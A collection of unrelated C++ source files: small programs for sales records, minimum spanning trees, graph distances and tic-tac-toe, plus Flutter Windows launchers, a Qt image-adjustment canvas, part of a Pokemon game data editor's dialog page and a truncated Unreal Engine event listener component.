    "#include <iostream>\r\n#include <cstring>\r\n\r\nusing namespace std;\r\n\r\nstruct toko_alat_konstruksi {\r\n    int barang;\r\n    char produk[50];  \r\n    double harga;\r\n};\r\n\r\nconst int melebihi_kapasitas = 100;\r\ntoko_alat_konstruksi penjualan[melebihi_kapasitas];\r\nint total_penjualan = 0;\r\n\r\nvoid produk(int id_barang, const char* nama_produk, double harga) {\r\n    if (total_penjualan < melebihi_kapasitas) {\r\n        penjualan[total_penjualan].barang = id_barang;\r\n        strncpy(penjualan[total_penjualan].produk, nama_produk, sizeof(penjualan[total_penjualan].produk) - 1);\r\n        penjualan[total_penjualan].produk[sizeof(penjualan[total_penjualan].produk) - 1] = '\\0';  \r\n        penjualan[total_penjualan].harga = harga;\r\n        total_penjualan++;\r\n    } else {\r\n        cout << \"Error: Penjualan penuh, tidak bisa menambah lebih banyak.\" << endl;\r\n    }\r\n}\r\n\r\nvoid readSales() {\r\n    for (int i = 0; i < total_penjualan; ++i) {\r\n        cout << \"ID: \" << penjualan[i].barang << \", Produk: \" << penjualan[i].produk << \", Harga: $\" << penjualan[i].harga << endl;\r\n    }\r\n}\r\n\r\nint main() {\r\n    produk(1, \"Excavator\", 25000.0);\r\n    produk(2, \"Crane\", 35000.0);\r\n    produk(3, \"Hard Hats\", 150.0);\r\n    produk(4, \"Reflective vest\", 100.0);\r\n    produk(5, \"Safety Boots\", 100.0);\r\n\r\n    cout << \"Daftar Produk di Toko Alat Konstruksi:\" << endl;\r\n    readSales();\r\n\r\n    return 0;\r\n}",
    "#include<iostream>\n#include<bits/stdc++.h>\n#define V 5\nusing namespace std;\n\nint minKey(int key[], bool mstSet[])\n{\n\tint min = INT_MAX, min_index;\n\tfor (int v = 0; v < V; v++)\n\t\tif (mstSet[v] == false && key[v] < min)\n\t\t\tmin = key[v], min_index = v;\n\treturn min_index;\n}\nvoid printMST(int parent[], int graph[V][V])\n{\n\tcout << \"Edge \\tWeight\\n\";\n\tfor (int i = 1; i < V; i++)\n\t\tcout << parent[i] << \" - \" << i << \" \\t\"\n\t\t\t<< graph[i][parent[i]] << \" \\n\";\n}\nvoid primMST(int graph[V][V])\n{\n\tint parent[V];\n\tint key[V];\n\tbool mstSet[V];\n\tfor (int i = 0; i < V; i++)\n\t\tkey[i] = INT_MAX, mstSet[i] = false;\n\tkey[0] = 0;\n\tparent[0] = -1;\n\tfor (int count = 0; count < V - 1; count++) {\n\t\tint u = minKey(key, mstSet);\n\t\tmstSet[u] = true;\n\t\tfor (int v = 0; v < V; v++)\n\t\t\tif (graph[u][v] && mstSet[v] == false\n\t\t\t\t&& graph[u][v] < key[v])\n\t\t\t\tparent[v] = u, key[v] = graph[u][v];\n\t}\n\tprintMST(parent, graph);\n}\nint main()\n{\n\tint graph[V][V] = { { 0, 2, 0, 6, 0 },\n\t\t\t \t\t\t{ 2, 0, 3, 8, 5 },\n\t\t\t    \t\t{ 0, 3, 0, 0, 7 },\n\t\t\t   \t\t\t{ 6, 8, 0, 0, 9 },\n\t\t\t    \t\t{ 0, 5, 7, 9, 0 } };\n\tprimMST(graph);\n\treturn 0;\n}\n",
    "/*\n** EPITECH PROJECT, 2024\n** RayBan\n** File description:\n** Triangle\n*/\n\n#include \"TriangleObj.hpp\"\n\nbool TriangleObj::hits(const Ray &ray, Interval ray_d, HitRecord &hitrec) const\n{\n    Vector3D edge1 = _vertices[1] - _vertices[0];\n    Vector3D edge2 = _vertices[2] - _vertices[0];\n\n    Vector3D pvec = ray.direction().cross(edge2);\n    float det = edge1.dot(pvec);\n    if (det > -0.00001 && det < 0.00001)\n        return false;\n\n    float inv_det = static_cast<float>(1.0 / det);\n    Vector3D tvec = ray.origin() - _vertices[0];\n    float u = inv_det * tvec.dot(pvec);\n    if (u < 0.0 || u > 1.0)\n        return false;\n\n    Vector3D qvec = tvec.cross(edge1);\n    float v = inv_det * ray.direction().dot(qvec);\n    if (v < 0.0 || u + v > 1.0)\n        return false;\n\n    float t = inv_det * edge2.dot(qvec);\n    if (t > 0.00001 && ray_d.surrounds(t)) {\n        auto normal = _normals[0] * (1 - u - v) + _normals[1] * u + _normals[2] * v;\n        hitrec.t = t;\n        hitrec.p = ray.at(t);\n        hitrec.normal = normal;\n        hitrec.material = _material;\n        return true;\n    }\n    return false;\n}",
    "#include <iostream>\r\n#include <fstream>\r\n#include <vector>\r\n#include <string>\r\n#include <unordered_map>\r\n\r\n#include \"EnterosInf.h\"\r\n\r\nusing namespace std;\r\n\r\n// resuelve un caso de prueba, leyendo de la entrada la\r\n// configuraci\u00f3n, y escribiendo la respuesta\r\nbool resuelveCaso() {\r\n    int P, N;\r\n\r\n   cin >> P >> N;\r\n\r\n   if (!cin)\r\n      return false;\r\n\r\n    vector<vector<EntInf>> listAdy(P, vector<EntInf>(P, Infinito));\r\n    vector<vector<EntInf>> dist;\r\n    unordered_map<string,int> m;\r\n    int cont = 0;\r\n\r\n    for (int i = 0; i < P; i++)\r\n        listAdy[i][i] = 0;\r\n\r\n    for (int i = 0; i < N; i++) {\r\n        string p1, p2;\r\n        int i1, i2;\r\n\r\n        cin >> p1 >> p2;\r\n\r\n        if (!m.count(p1))\r\n            m[p1] = cont++;\r\n        if (!m.count(p2))\r\n            m[p2] = cont++;\r\n\r\n        listAdy[m[p1]][m[p2]] = 1;\r\n        listAdy[m[p2]][m[p1]] = 1;\r\n    }\r\n\r\n    dist = listAdy;\r\n\r\n    for (int k = 0; k < P; ++k) {\r\n        for (int i = 0; i < P; ++i) {\r\n            for (int j = 0; j < P; ++j) {\r\n                EntInf temp = dist[i][k] + dist[k][j];\r\n                if (temp < dist[i][j]) {\r\n                    dist[i][j] = temp;\r\n                    listAdy[i][j] = listAdy[k][j];\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    EntInf max = -1;\r\n\r\n    for (int i = 0; i < P; i++)\r\n        for (int j = 0; j < P; j++)\r\n            if (dist[i][j] > max)\r\n                max = dist[i][j];\r\n\r\n    if (max == Infinito)\r\n        cout << \"DESCONECTADA\\n\";\r\n    else\r\n        cout << max << '\\n';\r\n\r\n   return true;\r\n}\r\n\r\nint main() {\r\n   // ajustes para que cin extraiga directamente de un fichero\r\n#ifndef DOMJUDGE\r\n   std::ifstream in(\"casos.txt\");\r\n   auto cinbuf = std::cin.rdbuf(in.rdbuf());\r\n#endif\r\n   \r\n   while (resuelveCaso());\r\n   \r\n   // para dejar todo como estaba al principio\r\n#ifndef DOMJUDGE\r\n   std::cin.rdbuf(cinbuf);\r\n   system(\"PAUSE\");\r\n#endif\r\n   return 0;\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"delivery_flutter\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"canvas.h\"\r\ncanvas::canvas(QImage* temp) // \u041a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\r\n{\r\n    image=temp;\r\n    buffer = image->copy();\r\n    setWindowTitle(\"canvas\");\r\n    setFocusPolicy(Qt::StrongFocus);\r\n}\r\n\r\nvoid canvas::paintEvent(QPaintEvent *) // \u041e\u0442\u0440\u0438\u0441\u043e\u0432\u043a\u0430\r\n{\r\n    QPainter painter(this);\r\n    QColor color(40,40,40,255);\r\n    QBrush brush;\r\n    brush.setColor(color);\r\n    brush.setStyle(Qt::SolidPattern);\r\n    painter.setBrush(brush);\r\n    painter.drawRect(0,0,this->width(),this->height());\r\n    painter.drawImage(offsetX,offsetY,buffer);\r\n}\r\n\r\nvoid canvas::saveImage(QImage &im) // \u0421\u043e\u0445\u0440\u0430\u043d\u0438\u0442\u044c \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0435\r\n{\r\n    calculateImage(im);\r\n    QString ret = QFileDialog::getSaveFileName(this,\"Save image\",\"\",\"*.png\");\r\n    if (ret==\"\")return;\r\n    im.save(ret,\"PNG\");\r\n}\r\n\r\nvoid canvas::drawCanv() // \u041f\u043e\u0434\u0433\u043e\u0442\u043e\u0432\u043a\u0430 \u043a \u043e\u0442\u0440\u0438\u0441\u043e\u0432\u043a\u0435\r\n{\r\n    buffer = image->copy();\r\n    calculateImage(buffer);\r\n    repaint();\r\n}\r\n\r\nvoid canvas::calculateImage(QImage & inputImage) // \u0420\u0430\u0441\u0447\u0435\u0442 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0439 \u043f\u0438\u043a\u0441\u0435\u043b\u0435\u0439 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f\r\n{\r\n    // \u0442\u0438\u043f\u0430 \u043d\u043e\u0440\u043c\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0439 \u043d\u043e \u0432\u043e\u043e\u0431\u0449\u0435 \u043d\u0435 \u043e\u043d\u0430\r\n    double val = EXcoef/100.;\r\n    double val2 = HLcoef/100.*pow(HLcoef/200.,2);\r\n    double val3 = SHcoef/100.;\r\n    double val4 = pow(CBcoef/100.,2);\r\n    double val5 = pow(TIcoef/100.,2);\r\n\r\n    // \u041d\u0438\u0436\u0435 \u0431\u0430\u043d\u0430\u043b\u044c\u043d\u0430\u044f \u0440\u0435\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u0430\u043b\u0433\u043e\u0440\u0438\u0442\u043c\u0430 \u0441\u0432\u0435\u0440\u0442\u043a\u0438 \u0434\u043b\u044f \u044d\u0444\u0444\u0435\u043a\u0442\u0430 blur, \u0441\u0442\u043e\u0438\u0442 \u0437\u0430\u043c\u0435\u043d\u0438\u0442\u044c \u043d\u0430 \u0438\u043d\u043e\u0439 \u0430\u043b\u0433\u043e\u0440\u0438\u0442\u043c\r\n    if (COcoef!=0) // \u043f\u0440\u0438 \u0443\u0441\u043b\u043e\u0432\u0438\u0438 \u0447\u0442\u043e \u043d\u0443\u0436\u0435\u043d \u0431\u043b\u044e\u0440\r\n    {\r\n        QImage temp = inputImage.copy();\r\n        for(int i = 0; i < inputImage.height(); i++)\r\n        {\r\n            QRgb *line = reinterpret_cast<QRgb*>(inputImage.scanLine(i));\r\n            for(int j = 0;  j< inputImage.width(); j++)\r\n            {\r\n                QRgb &rgb = line[j];\r\n                QColor color(rgb);\r\n                float redavg = 0;\r\n                float greenavg = 0;\r\n                float blueavg = 0;\r\n                for (int k = -COcoef; k<COcoef; k++)\r\n                {\r\n                    if ((i+k)<0 || (i+k) > temp.height()-1)continue;\r\n\r\n                    for (int m = -COcoef; m<COcoef; m++)\r\n                    {\r\n                        if ((j+m)<0 || (j+m) > temp.width()-1)continue;\r\n                        redavg = redavg+temp.pixelColor(j+m,i+k).redF();\r\n                        greenavg = greenavg+temp.pixelColor(j+m,i+k).greenF();\r\n                        blueavg = blueavg+temp.pixelColor(j+m,i+k).blueF();\r\n                    }\r\n                }\r\n                redavg = redavg/COcoef/COcoef/4;\r\n                greenavg = greenavg/COcoef/COcoef/4;\r\n                blueavg = blueavg/COcoef/COcoef/4;\r\n                color.setRgbF(redavg,greenavg,blueavg);\r\n                rgb = color.rgb();\r\n            }\r\n        }\r\n    }\r\n\r\n    float sum;\r\n    float hlcoef;\r\n    float Shcoef;\r\n    // \u041d\u0438\u0436\u0435 \u043f\u0440\u0438\u043c\u0435\u043d\u0435\u043d\u0438\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0439 \u0441\u043b\u0430\u0439\u0434\u0435\u0440\u043e\u0432 \u043a \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044e\r\n    for (int y = 0; y < inputImage.height(); y++)\r\n    {\r\n        QRgb *line = reinterpret_cast<QRgb*>(inputImage.scanLine(y));\r\n        for (int x = 0; x < inputImage.width(); x++)\r\n        {\r\n            QRgb &rgb = line[x];\r\n            QColor color(rgb);\r\n\r\n            // \u041f\u043e\u0434\u0431\u043e\u0440 \u0444\u0443\u043d\u043a\u0446\u0438\u0439 \u043f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u043e\u0432\u0430\u043d\u0438\u044f \u0431\u044b\u043b \u0441\u0434\u0435\u043b\u0430\u043d \"\u043d\u0430 \u0433\u043b\u0430\u0437\"\r\n            color.setRedF(color.redF()*val4*val5);\r\n            color.setGreenF(color.greenF()*val4*(1/val5));\r\n            color.setBlueF(color.blueF()*(1/(val4)*(1/(val4)))*val5);\r\n\r\n            color.setRgbF(color.redF()*val, color.greenF()*val, color.blueF()*val);\r\n\r\n            sum = color.redF()+color.greenF()+color.blueF();\r\n            hlcoef = ((pow((1.5*sum-1),3.)+1)*val2) + 1;\r\n            color.setRgbF(color.redF()*hlcoef, color.greenF()*hlcoef, color.blueF()*hlcoef);\r\n\r\n            sum = color.redF()+color.greenF()+color.blueF();\r\n            Shcoef = ((1/(5*sum))*val3)+1;\r\n            color.setRgbF(color.redF()*Shcoef, color.greenF()*Shcoef, color.blueF()*Shcoef);\r\n\r\n            rgb = color.rgb();\r\n        }\r\n    }\r\n}\r\n\r\nvoid canvas::EXChange(int input) // \u0418\u0437\u043c\u0435\u043d\u0435\u043d\u0438\u0435 \u044d\u043a\u0441\u043f\u043e\u0437\u0438\u0446\u0438\u0438\r\n{\r\n    EXcoef=input;\r\n    drawCanv();\r\n}\r\n\r\nvoid canvas::HLChange(int input) // \u0418\u0437\u043c\u0435\u043d\u0435\u043d\u0438\u0435 \u0441\u0432\u0435\u0442\u043b\u044b\u0445 \u043e\u0431\u043b\u0430\u0441\u0442\u0435\u0439\r\n{\r\n    HLcoef = input;\r\n    drawCanv();\r\n}\r\n\r\nvoid canvas::SHChange(int input) // \u0418\u0437\u043c\u0435\u043d\u0435\u043d\u0438\u0435 \u0442\u0435\u043d\u0435\u0439\r\n{\r\n    SHcoef=input;\r\n    drawCanv();\r\n}\r\n\r\nvoid canvas::COChange(int input) // \u0418\u0437\u043c\u0435\u043d\u0435\u043d\u0438\u0435 \u0431\u043b\u044e\u0440\u0430\r\n{\r\n    COcoef = input;\r\n    drawCanv();\r\n}\r\n\r\nvoid canvas::CBChange(int input) // \u0418\u0437\u043c\u0435\u043d\u0435\u043d\u0438\u0435 \u0442\u0435\u043c\u043f\u0435\u0440\u0430\u0442\u0443\u0440\u044b\r\n{\r\n    CBcoef = input;\r\n    drawCanv();\r\n}\r\n\r\nvoid canvas::TIChange(int input) // \u0418\u0437\u043c\u0435\u043d\u0435\u043d\u0438\u0435 \u043e\u0442\u0442\u0435\u043d\u043a\u0430\r\n{\r\n    TIcoef = input;\r\n    drawCanv();\r\n}\r\n\r\nvoid canvas::keyPressEvent(QKeyEvent *e) // \u041d\u0430\u0432\u0438\u0433\u0430\u0446\u0438\u044f \u043f\u043e \u0445\u043e\u043b\u0441\u0442\u0443 \u0447\u0435\u0440\u0435\u0437 WASD\r\n{\r\n    if (e->key()==Qt::Key_W)offsetY = offsetY+10;\r\n    if (e->key()==Qt::Key_A)offsetX = offsetX+10;\r\n    if (e->key()==Qt::Key_S)offsetY = offsetY-10;\r\n    if (e->key()==Qt::Key_D)offsetX = offsetX-10;\r\n    repaint();\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"onesignal_v3_crash\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\nusing namespace std;\r\n\r\n// Function to display the Tic-Tac-Toe board\r\nvoid printBoard(char board[3][3]) {\r\n    cout << \"\\n\";\r\n    for (int i = 0; i < 3; ++i) {\r\n        for (int j = 0; j < 3; ++j) {\r\n            cout << board[i][j];\r\n            if (j < 2) std::cout << \" | \";\r\n        }\r\n        cout << \"\\n\";\r\n        if (i < 2) std::cout << \"--|---|--\\n\";\r\n    }\r\n    cout << \"\\n\";\r\n}\r\n\r\n// Function to check if a player has won\r\nbool checkWin(char board[3][3], char mark) {\r\n    // Check rows, columns, and diagonals\r\n    for (int i = 0; i < 3; i++) {\r\n        if (board[i][0] == mark && board[i][1] == mark && board[i][2] == mark) return true;\r\n        if (board[0][i] == mark && board[1][i] == mark && board[2][i] == mark) return true;\r\n    }\r\n    if (board[0][0] == mark && board[1][1] == mark && board[2][2] == mark) return true;\r\n    if (board[0][2] == mark && board[1][1] == mark && board[2][0] == mark) return true;\r\n    return false;\r\n}\r\n\r\n// Function to check if the game is a draw\r\nbool checkDraw(char board[3][3]) {\r\n    for (int i = 0; i < 3; i++) {\r\n        for (int j = 0; j < 3; j++) {\r\n            if (board[i][j] == ' ') return false;\r\n        }\r\n    }\r\n    return true;\r\n}\r\n\r\n// Function to switch players\r\nchar switchPlayer(char currentPlayer) {\r\n    return (currentPlayer == 'X') ? 'O' : 'X';\r\n}\r\n\r\nint main() {\r\n    char board[3][3] = {{' ', ' ', ' '}, {' ', ' ', ' '}, {' ', ' ', ' '}};\r\n    char curr_play = 'X';\r\n    int row, col;\r\n    bool gameOver = false;\r\n\r\n    cout << \"Welcome to Tic-Tac-Toe!\\n\";\r\n\r\n    while (!gameOver) {\r\n        printBoard(board);\r\n\r\n        // Prompt current player to make a move\r\n        cout << \"Player \" << curr_play << \", enter your move (row and column: 0, 1, or 2): \";\r\n        cin >> row >> col;\r\n\r\n        // Check if the move is valid\r\n        if (row >= 0 && row < 3 && col >= 0 && col < 3 && board[row][col] == ' ') {\r\n            board[row][col] = curr_play;\r\n\r\n            // Check for a win\r\n            if (checkWin(board, curr_play)) {\r\n                printBoard(board);\r\n                cout << \"Player \" << curr_play << \" wins!\\n\";\r\n                gameOver = true;\r\n            }\r\n            // Check for a draw\r\n            else if (checkDraw(board)) {\r\n                printBoard(board);\r\n                cout << \"The game is a draw!\\n\";\r\n                gameOver = true;\r\n            }\r\n            // Switch players if the game is not over\r\n            else {\r\n                curr_play = switchPlayer(curr_play);\r\n            }\r\n        } else {\r\n            cout << \"Invalid move. Try again.\\n\";\r\n        }\r\n    }\r\n\r\n    // Prompt to play again\r\n    char playAgain;\r\n    cout << \"Do you want to play again? (y/n): \";\r\n    cin >> playAgain;\r\n\r\n    if (playAgain == 'y' || playAgain == 'Y') {\r\n        main();  // Restart the game\r\n    } else {\r\n        cout << \"Thanks for playing!\\n\";\r\n    }\r\n\r\n    return 0;\r\n}\r\n\r\n\r\n\r\n",
    "// MemPmPage.cpp : \u5b9e\u73b0\u6587\u4ef6\n//\n\n#include \"stdafx.h\"\n#include \"PokemonMemHack.h\"\n\n// CMemPmPage \u5bf9\u8bdd\u6846\n\nIMPLEMENT_DYNAMIC(CMemPmPage, CPropertyPage)\nCMemPmPage::CMemPmPage()\n\t: CPropertyPage(CMemPmPage::IDD)\n{\n\tm_dwCurPm = -1;\n\tm_dwCurTabPage = -1;\n\n\tm_pageBasic.m_szPageName = _T(\"\u57fa\u672c\");\n\tm_rgpPages[0] = &m_pageBasic;\n\n\tm_pageAbility.m_szPageName = _T(\"\u80fd\u529b\");\n\tm_rgpPages[1] = &m_pageAbility;\n\n\tm_pageSkill.m_szPageName = _T(\"\u6280\u80fd\");\n\tm_rgpPages[2] = &m_pageSkill;\n\n\tm_pageRibbon.m_szPageName = _T(\"\u7f0e\u5e26\");\n\tm_rgpPages[3] = &m_pageRibbon;\n\n\tm_pageMisc.m_szPageName = _T(\"\u5176\u5b83\");\n\tm_rgpPages[4] = &m_pageMisc;\n}\n\nCMemPmPage::~CMemPmPage()\n{\n}\n\nvoid CMemPmPage::DoDataExchange(CDataExchange* pDX)\n{\n\tCPropertyPage::DoDataExchange(pDX);\n\n\tDDX_Control(pDX, IDC_TAB, m_ctrlTab);\n\tDDX_Control(pDX, IDC_PM_LIST, m_ctrlPmList);\n\tDDX_Control(pDX, IDC_CONFIRM, m_ctrlConfirm);\n}\n\n\nBEGIN_MESSAGE_MAP(CMemPmPage, CPropertyPage)\n\tON_BN_CLICKED(IDC_LANG_CN, OnBnClickedLangCn)\n\tON_BN_CLICKED(IDC_LANG_JP, OnBnClickedLangJp)\n\tON_BN_CLICKED(IDC_COUNT_DEC, OnBnClickedCountDec)\n\tON_BN_CLICKED(IDC_COUNT_HEX, OnBnClickedCountHex)\n\tON_BN_CLICKED(IDC_REFRESH, OnBnClickedRefresh)\n\tON_BN_CLICKED(IDC_CONFIRM, OnBnClickedConfirm)\n\tON_NOTIFY(LVN_ITEMCHANGED, IDC_PM_LIST, OnLvnItemchangedPmList)\n\tON_NOTIFY(TCN_SELCHANGE, IDC_TAB, OnTcnSelchangeTab)\n\tON_BN_CLICKED(IDC_LANG_EN, OnBnClickedLangEn)\n\tON_BN_CLICKED(IDC_COUNT_NONE, OnBnClickedCountNone)\n\tON_BN_CLICKED(IDC_MOVE_UP, OnBnClickedMoveUp)\n\tON_BN_CLICKED(IDC_MOVE_DOWN, OnBnClickedMoveDown)\nEND_MESSAGE_MAP()\n\n\n// CMemPmPage \u6d88\u606f\u5904\u7406\u7a0b\u5e8f\nvoid CMemPmPage::ShowTabPage(DWORD dwPageIndex)\n{\n\tif(m_dwCurTabPage != dwPageIndex)\n\t{\n\t\tif(m_dwCurTabPage < MEM_PM_PAGE_COUNT)\n\t\t\tm_rgpPages[m_dwCurTabPage]->ShowWindow(SW_HIDE);\n\t\tm_dwCurTabPage = dwPageIndex;\n\t\tif(m_dwCurTabPage < MEM_PM_PAGE_COUNT)\n\t\t\tm_rgpPages[m_dwCurTabPage]->ShowWindow(SW_SHOW);\n\t}\n}\n\nBOOL CMemPmPage::OnInitDialog()\n{\n\tCPropertyPage::OnInitDialog();\n\n\tDWORD\tdwIndex;\n\tCRect\trect;\n\tCString\tszText;\n\n\tfor(dwIndex = 0; dwIndex < MEM_PM_PAGE_COUNT; ++dwIndex)\n\t{\n\t\tm_ctrlTab.InsertItem(dwIndex, m_rgpPages[dwIndex]->m_szPageName);\n\t}\n\n\tm_ctrlTab.GetWindowRect(&rect);\n\tm_ctrlTab.AdjustRect(FALSE, &rect);\n\tm_ctrlTab.ScreenToClient(&rect);\n\n\tfor(dwIndex = 0; dwIndex < MEM_PM_PAGE_COUNT; ++dwIndex)\n\t{\n\t\tm_rgpPages[dwIndex]->Create(m_rgpPages[dwIndex]->m_uTemplateId, &m_ctrlTab);\n\t\tm_rgpPages[dwIndex]->ShowWindow(SW_HIDE);\n\t\tm_rgpPages[dwIndex]->MoveWindow(&rect);\n\t}\n\n\tm_ctrlPmList.SetIconSpacing(SMALL_ICON_BIT_WIDTH + 10, SMALL_ICON_BIT_HEIGHT + 22);\n\tm_ctrlPmList.SetExtendedStyle(LVS_EX_BORDERSELECT);\n\tm_ctrlPmList.SetItemCount(ACTIVE_POKEMON_COUNT);\n\n\tCheckDlgButton(IDC_LANG_CN + cfg.dwLang, BST_CHECKED);\n\n\tCheckDlgButton(IDC_COUNT_NONE + cfg.dwCount, BST_CHECKED);\n\n\tOnChangeUILang();\n\n\tShowTabPage(0);\n\n\treturn TRUE;  // return TRUE unless you set the focus to a control\n\t// \u5f02\u5e38: OCX \u5c5e\u6027\u9875\u5e94\u8fd4\u56de FALSE\n}\n\nvoid CMemPmPage::SetPmList(BOOL bSelectionOnly)\n{\n\tDWORD\tdwIndex, dwCount;\n\tWORD\twBreed;\n\tCString\tszText;\n\tLVITEM\tlvi;\n/*\n\tlvi.iSubItem = 0;\n\tlvi.mask = LVIF_TEXT;\n\n\tdwCount = m_ctrlPmList.GetItemCount();\n\tfor(dwIndex = 0; dwIndex < ACTIVE_POKEMON_COUNT; ++dwIndex)\n\t{\n\t\tif(g_MemHack.m_pActivePokeCodec == NULL)\n\t\t{\n\t\t\twBreed = 0;\n\t\t}\n\t\telse\n\t\t{\n\t\t\twBreed = g_MemHack.m_pActivePokeCodec[dwIndex].GetBreed();\n\t\t}\n\n\t\tlvi.iItem = dwIndex;\n\t\tszText.Format(_T(\"%lu:\"), dwIndex + 1);\n\t\tif(wBreed < BREED_COUNT)\n\t\t\tszText += cfg.pBreedNameList[wBreed].rgszText[cfg.dwLang];\n\t\telse\n\t\t\tszText += _T(\"\u672a\u77e5\");\n\t\tlvi.pszText = szText.GetBuffer();\n\t\tif(dwIndex < dwCount)\n\t\t\tm_ctrlPmList.SetItem(&lvi);\n\t\telse\n\t\t\tm_ctrlPmList.InsertItem(&lvi);\n\t\tszText.ReleaseBuffer();\n\t}\n*/\n\tif(!g_MemRom.m_bOpened)\n\t\treturn;\n\n\tlvi.iSubItem = 0;\n\tif(!bSelectionOnly)\n\t{\n\t\tlvi.mask = LVIF_IMAGE | LVIF_TEXT;\n\t\tm_ctrlPmList.SetImageList(g_MemRom.m_pTinyIconList, LVSIL_NORMAL);\n\t\tdwCount = m_ctrlPmList.GetItemCount();\n\t\tfor(dwIndex = 0; dwIndex < ACTIVE_POKEMON_COUNT; ++dwIndex)\n\t\t{\n\t\t\tif(g_MemHack.m_pActivePokeCodec == NULL)\n\t\t\t{\n\t\t\t\twBreed = 0;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\twBreed = g_MemHack.m_pActivePokeCodec[dwIndex].GetBreed();\n\t\t\t}\n\t\t\tif(wBreed == 0 || wBreed >= BREED_COUNT)\n\t\t\t\twBreed = 0x114;\n\n\t\t\tlvi.iItem = dwIndex;\n\t\t\tlvi.iImage = g_MemRom.GetSmallIconIndex(wBreed, rand() % g_MemRom.GetSmallIconCount(wBreed));\n\n\t\t\tszText.Format(_T(\"%lu\"), dwIndex + 1);\n\t\t\tlvi.pszText = szText.GetBuffer();\n\t\t\tif(dwIndex < dwCount)\n\t\t\t\tm_ctrlPmList.SetItem(&lvi);\n\t\t\telse\n\t\t\t\tm_ctrlPmList.InsertItem(&lvi);\n\t\t\tszText.ReleaseBuffer();\n\t\t}\n\t}\n\telse if(m_dwCurPm < ACTIVE_POKEMON_COUNT)\n\t{\n\t\tlvi.mask = LVIF_IMAGE;\n\t\tlvi.iItem = m_dwCurPm;\n\t\twBreed = g_MemHack.m_pActivePokeCodec[m_dwCurPm].GetBreed();\n\t\tif(wBreed == 0 || wBreed >= BREED_COUNT)\n\t\t\twBreed = 0x114;\n\t\tlvi.iImage = g_MemRom.GetSmallIconIndex(wBreed, rand() % g_MemRom.GetSmallIconCount(wBreed));\n\n\t\tm_ctrlPmList.SetItem(&lvi);\n\t}\n\n\tif(m_dwCurPm >= ACTIVE_POKEMON_COUNT)\n\t\tm_ctrlPmList.SetItemState(0, -1, LVIS_SELECTED | LVIS_FOCUSED);\n\n\tif(bSelectionOnly)\n\t{\n\t\tm_pageAbility.TransData(TR",
    "\ufeff// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"EventListenerComponent.h\"\n\n#include \"EventManagerSubsystem.h\"\n\n\n// Sets default values for this component's properties\nUEventListenerComponent::UEventListenerComponent()\n{\n\t// Set this component to be initialized when the game starts, and to be ticked every frame.  You can turn these features\n\t// off to improve performance if you don't need them.\n\tPrimaryComponentTick.bCanEverTick = false;\n\n\t// ...\n}\n\n\n// Called when the game starts\nvoid UEventListenerComponent::BeginPlay()\n{\n\tSuper::BeginPlay();\n\tDefaultEventData = EventData;\n\tif (UEventManagerSubsystem* EventManager = GetWorld()->GetSubsystem<UEventManagerSubsystem>())\n\t{\n\t\tEventManager->OnEventCalledDelegate.AddUObject(this, &ThisClass::OnEventReceived);\n\t}\n}\n\nvoid UEventListenerComponent::OnEventReceived(FName Event)\n{\n\tif(EventData.ActivationByEvent && EventData.ActivationEvent == Event)\n\t{\n\t\tActivateByEvent();\n\t}\n\tif(EventData.DeactivationByEvent && 